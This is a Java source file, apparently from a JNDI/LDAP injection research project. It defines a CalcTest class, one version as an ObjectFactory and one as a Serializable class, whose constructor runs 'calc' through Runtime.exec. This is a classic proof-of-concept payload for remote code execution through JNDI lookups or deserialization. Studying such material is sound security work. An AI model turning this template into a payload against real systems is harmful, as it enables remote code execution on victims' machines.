package com.r17a.jndi.ldap;

import java.io.IOException;
import java.io.Serializable;

//public class CalcTest implements ObjectFactory {
//
//    public CalcTest() throws IOException {
//        Runtime.getRuntime().exec("calc");
//    }
//
//    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
//        return new Integer(1);
//    }
//}

public class CalcTest implements Serializable {

    private static final long serialVersionUID = -3858195503738032307L;

    public CalcTest() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    public void calc() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}